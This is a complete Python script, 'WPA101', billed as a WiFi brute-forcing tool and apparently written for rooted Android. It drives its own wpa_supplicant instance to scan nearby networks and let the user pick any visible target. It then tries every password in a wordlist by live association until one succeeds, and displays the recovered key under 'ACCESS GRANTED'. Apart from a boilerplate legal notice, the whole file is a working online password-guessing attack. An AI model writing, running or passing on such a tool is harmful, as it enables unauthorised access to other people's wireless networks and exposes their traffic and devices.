#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, os, re, time, socket, tempfile, subprocess, shutil, signal
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.align import Align
from rich.text import Text
from rich import box

console = Console()
IFACE = "wlan0"
DEBUG = False

class WpaEngine:
    def __init__(self, iface):
        self.iface = iface
        self.tempdir = tempfile.mkdtemp(prefix="wpajoin_")
        self.ctrl_path = f"{self.tempdir}/{iface}"
        self.conf_path = f"{self.tempdir}/wpa.conf"

        with open(self.conf_path, "w") as f:
            f.write(
                f"ctrl_interface={self.tempdir}\n"
                f"ctrl_interface_group=0\n"
                f"update_config=0\n"
                f"ap_scan=1\n"
            )

        self.sock_path = f"{tempfile._get_default_tempdir()}/wpajoin_{os.getpid()}"
        if os.path.exists(self.sock_path):
            os.unlink(self.sock_path)
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.sock.bind(self.sock_path)
        self.sock.settimeout(1.5)

        self.proc = None
        self._start()

    def _start(self):
        self._stop(silent=True)

        cmd = [
            "wpa_supplicant",
            "-K", "-d",
            "-Dnl80211,wext,hostapd,wired",
            "-i", self.iface,
            "-c", self.conf_path,
        ]
        if DEBUG:
            console.print(f"[dim]$ {' '.join(cmd)}[/]")

        self.proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            encoding="utf-8", errors="replace", bufsize=1
        )
        for _ in range(60):
            if os.path.exists(self.ctrl_path):
                return True
            if self.proc.poll() is not None:
                out = self.proc.stdout.read() if self.proc.stdout else ""
                raise RuntimeError(f"wpa_supplicant died:\n{out}")
            time.sleep(0.1)
        raise RuntimeError("wpa_supplicant control socket never appeared")

    def _stop(self, silent=False):
        try:
            if self.proc and self.proc.poll() is None:
                self.proc.terminate()
                try: self.proc.wait(timeout=3)
                except subprocess.TimeoutExpired: self.proc.kill()
        except Exception:
            pass
        self.proc = None

    def cmd(self, verb, timeout=8):
        try:
            self.sock.sendto(verb.encode(), self.ctrl_path)
        except Exception as e:
            return f"__SEND_ERR__ {e}"
        deadline = time.time() + timeout
        buf = ""
        while time.time() < deadline:
            try:
                data, _ = self.sock.recvfrom(8192)
                buf += data.decode("utf-8", "replace")
                if buf and buf.rstrip().endswith(("OK", "FAIL", "\n")):
                    time.sleep(0.05)
                    try:
                        self.sock.settimeout(0.15)
                        more, _ = self.sock.recvfrom(8192)
                        buf += more.decode("utf-8", "replace")
                    except socket.timeout:
                        pass
                    finally:
                        self.sock.settimeout(1.5)
                    break
            except socket.timeout:
                break
        return buf

    def drain_proc(self):
        if not self.proc or not self.proc.stdout:
            return ""
        out = []
        import select
        fd = self.proc.stdout.fileno()
        while True:
            r, _, _ = select.select([fd], [], [], 0.05)
            if not r:
                break
            line = self.proc.stdout.readline()
            if not line:
                break
            out.append(line)
        text = "".join(out)
        if DEBUG and text:
            sys.stderr.write(text)
        return text

    def scan(self):
        self.cmd("SCAN")
        time.sleep(6)
        raw = self.cmd("SCAN_RESULTS", timeout=10)
        results = []
        for line in raw.splitlines():
            parts = line.split("\t")
            if len(parts) < 5:
                continue
            bssid, freq, rssi, flags, ssid = parts[:5]
            try:
                rssi = int(rssi)
            except ValueError:
                continue
            if not ssid.strip():
                continue
            if not (-88 <= rssi <= -20):
                continue
            results.append({
                "bssid": bssid.lower(),
                "ssid": ssid,
                "rssi": rssi,
                "freq": freq,
                "flags": flags,
            })
        best = {}
        for n in results:
            cur = best.get(n["ssid"])
            if not cur or n["rssi"] > cur["rssi"]:
                best[n["ssid"]] = n
        return sorted(best.values(), key=lambda x: x["rssi"], reverse=True)

    def join(self, ssid, password, wait=12):
        self.drain_proc()

        netid_reply = self.cmd("ADD_NETWORK")
        m = re.search(r"\d+", netid_reply)
        if not m:
            return {"ok": False, "reason": f"add_network failed: {netid_reply!r}"}
        netid = m.group(0)

        try:
            self.cmd(f'SET_NETWORK {netid} ssid "{ssid}"')
            self.cmd(f'SET_NETWORK {netid} psk "{password}"')
            self.cmd(f'SET_NETWORK {netid} key_mgmt WPA-PSK')
            self.cmd(f'SET_NETWORK {netid} proto WPA2')
            self.cmd(f"ENABLE_NETWORK {netid}")
            self.cmd(f"SELECT_NETWORK {netid}")

            deadline = time.time() + wait
            last_state = ""
            while time.time() < deadline:
                status = self.cmd("STATUS")
                mstate = re.search(r"wpa_state=(\S+)", status)
                if mstate:
                    last_state = mstate.group(1)
                    if last_state == "COMPLETED":
                        return {"ok": True, "state": last_state}
                    if last_state in ("4WAY_HANDSHAKE", "ASSOCIATED"):
                        pass
                    if last_state == "DISCONNECTED":
                        pass
                log = self.drain_proc()
                if "WRONG_KEY" in log or "4-Way Handshake failed" in log or \
                   "pre-shared key may be incorrect" in log.lower():
                    return {"ok": False, "reason": "wrong-psk", "state": last_state}
                if "Association request to the driver failed" in log:
                    return {"ok": False, "reason": "assoc-failed", "state": last_state}
                time.sleep(0.4)

            return {"ok": False, "reason": f"timeout ({last_state})", "state": last_state}
        finally:
            self.cmd(f"REMOVE_NETWORK {netid}")

    def cleanup(self):
        try:
            self.cmd("TERMINATE")
        except Exception:
            pass
        self._stop()
        try: self.sock.close()
        except Exception: pass
        try:
            if os.path.exists(self.sock_path):
                os.unlink(self.sock_path)
        except Exception: pass
        shutil.rmtree(self.tempdir, ignore_errors=True)

def banner():
    art = r"""
 ██╗    ██╗██████╗  █████╗  ██╗ ██████╗  ██╗
 ██║    ██║██╔══██╗██╔══██╗███║██╔═████╗███║
 ██║ █╗ ██║██████╔╝███████║╚██║██║██╔██║╚██║
 ██║███╗██║██╔═══╝ ██╔══██║ ██║████╔╝██║ ██║
 ╚███╔███╔╝██║     ██║  ██║ ██║╚██████╔╝ ██║
  ╚══╝╚══╝ ╚═╝     ╚═╝  ╚═╝ ╚═╝ ╚═════╝  ╚═╝
    """
    console.print(Panel(Align.center(Text(art, style="bold cyan")),
        title="[magenta]◤ WPA101 ◢[/]",
        subtitle="[light_green]WiFi Brute-forcing Tool  ·  SYLHETYHACKVENGER (THE-ERROR808)[/]",
        border_style="bright_blue", box=box.DOUBLE))

    warn = (
        "[bold red]⚠ WARNING ⚠[/]\n"
        "[yellow]This tool is for authorized security testing on your own router only. "
        "Unauthorized access to WiFi networks is illegal and punishable by law. "
        "The author assumes no liability for misuse. Use responsibly.[/]"
    )
    console.print(Panel(warn, title="[red]◤ LEGAL NOTICE ◢[/]",
                        border_style="red", box=box.HEAVY_EDGE))

def render_networks(nets):
    t = Table(title="[bright_cyan]◈ VISIBLE NETWORKS ◈[/]",
              box=box.HEAVY_EDGE, border_style="bright_blue",
              header_style="bold magenta")
    t.add_column("#", justify="right", style="yellow")
    t.add_column("SSID", style="bold white")
    t.add_column("BSSID", style="cyan")
    t.add_column("RSSI", justify="right", style="green")
    t.add_column("SEC", style="dim")
    for i, n in enumerate(nets, 1):
        t.add_row(str(i), n["ssid"], n["bssid"],
                  f"{n['rssi']} dBm", n["flags"][:20])
    console.print(t)
    console.print(Align.center(Text.from_markup(
        "[bold rgb(255,95,0)]Networks Between rssi -20 to -67 are strong and smooth networks[/]")))

def require_root_and_tools():
    if os.geteuid() != 0:
        console.print("[red]✖ Run as root:[/] [yellow]sudo python wpa101.py[/]")
        sys.exit(1)
    if not shutil.which("wpa_supplicant"):
        console.print("[red]✖ wpa_supplicant binary not found in PATH.[/]")
        console.print("[dim]Try: pkg install root-repo && pkg install tsu[/]")
        sys.exit(1)
    subprocess.run(f"ip link set {IFACE} up", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("svc wifi enable", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    banner()
    require_root_and_tools()

    console.print("[cyan]▶ Starting private wpa_supplicant engine…[/]")
    try:
        engine = WpaEngine(IFACE)
    except Exception as e:
        console.print(Panel(f"[red]{e}[/]\n\n"
            "[yellow]Your ROM likely strips nl80211 from wpa_supplicant.[/]\n"
            "[dim]Check: [bold]wpa_supplicant -Dnl80211 -i wlan0 -c /dev/null[/][/]",
            title="[red]◤ ENGINE FAILED TO START ◢[/]",
            border_style="red", box=box.DOUBLE))
        sys.exit(1)

    console.print("[green]✔ Engine running.[/]\n")

    try:
        while True:
            console.print("[cyan]▶ Scanning (6 s)…[/]")
            nets = engine.scan()
            if not nets:
                console.print("[red]✖ No networks found in range.[/]")
                break
            render_networks(nets)

            try:
                raw = console.input("\n[cyan]▶ Target # (Enter=rescan, 0=exit)[/]: ").strip()
                if raw == "":
                    continue
                if raw == "0" or raw.lower() == "q":
                    break
                pick = int(raw)
                target = nets[pick - 1]
            except Exception:
                console.print("[red]✖ Invalid selection.[/]")
                continue

            wl = console.input("[cyan]▶ Wordlist path[/]: ").strip().strip("'\"")
            wl = os.path.expanduser(wl)
            if not os.path.isfile(wl):
                console.print(f"[red]✖ Not found:[/] {wl}")
                continue
            with open(wl, errors="ignore") as f:
                words = [w.strip() for w in f if w.strip()]
            if not words:
                console.print("[red]✖ Empty wordlist.[/]")
                continue

            console.print(Panel(
                f"[bold]Target    :[/] [cyan]{target['ssid']}[/]\n"
                f"[bold]BSSID     :[/] {target['bssid']}\n"
                f"[bold]Candidates:[/] [green]{len(words)}[/]\n"
                f"[bold]Engine    :[/] private wpa_supplicant (nl80211)\n"
                f"[bold]Est. time :[/] ~{len(words)*5//60}m {len(words)*5%60}s  (5 s/attempt)",
                title="[magenta]◤ ATTACK STARTED ◢[/]",
                border_style="bright_red", box=box.DOUBLE))

            found = None
            found_at = 0
            start = time.time()

            with Progress(SpinnerColumn(style="bright_cyan"),
                          TextColumn("[cyan]{task.description}"),
                          BarColumn(bar_width=42, complete_style="bright_green"),
                          TextColumn("[green]{task.completed}[/]/[white]{task.total}[/]"),
                          TimeElapsedColumn(), console=console) as prog:
                task = prog.add_task("trying…", total=len(words))
                for i, pw in enumerate(words, 1):
                    masked = pw[:2] + "*" * max(0, len(pw) - 2)
                    prog.update(task, description=f"[yellow]{masked:<22}[/]")
                    res = engine.join(target["ssid"], pw, wait=10)
                    if res["ok"]:
                        found = pw
                        found_at = i
                        break
                    prog.advance(task)

            elapsed = time.time() - start
            console.print()

            if found:
                st = engine.cmd("STATUS")
                console.print(Panel(
                    f"[green]✔ CONNECTED[/]\n\n"
                    f"[bold]Network  :[/] [bright_cyan]{target['ssid']}[/]\n"
                    f"[bold]Password :[/] [bright_green]{found}[/]\n"
                    f"[bold]Found at :[/] attempt #{found_at} of {len(words)}\n"
                    f"[bold]Elapsed  :[/] {elapsed:.1f}s\n\n"
                    f"[dim]── wpa_supplicant status ──[/]\n{st.strip()[:400]}",
                    title="[bold green]◤ ACCESS GRANTED ◢[/]",
                    border_style="bright_green", box=box.DOUBLE))
                console.print("\n[cyan]↻ Returning to scan menu in 3 s…[/]")
                time.sleep(3)
            else:
                console.print(Panel(
                    f"[red]✖ No match in wordlist.[/]\n"
                    f"[dim]Tried {len(words)} candidates in {elapsed:.1f}s "
                    f"({elapsed/len(words):.1f}s each).[/]\n\n"
                    "[yellow]Checklist:[/]\n"
                    "  1. Correct password really in the list?\n"
                    "  2. Router uses WPA2-PSK? (WPA3-only will fail here)\n"
                    "  3. Set [bold]DEBUG=True[/] at the top and re-run to see\n"
                    "     the raw wpa_supplicant handshake log.",
                    title="[red]◤ ATTACK FAILED ◢[/]",
                    border_style="red", box=box.DOUBLE))
                console.print("\n[cyan]↻ Returning to scan menu in 3 s…[/]")
                time.sleep(3)

    finally:
        engine.cleanup()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]◤ aborted by user ◢[/]")
